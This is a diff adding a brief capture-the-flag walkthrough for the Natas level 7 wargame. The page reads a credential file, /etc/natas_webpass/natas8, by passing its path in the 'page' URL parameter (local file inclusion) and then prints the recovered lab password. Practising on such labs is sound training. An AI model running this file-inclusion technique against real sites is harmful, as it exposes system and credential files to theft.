@@ -1,0 +1,7 @@
+There are two links, one to Home and one to About, check how the URL changes when we clicked in them, the page is passed as a parameter
+
+Now, go to the source code, there is a hint - <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+
+We pass /etc/natas_webpass/natas8 as a parameter in the URL -> http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+The password for level8 is there -> xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
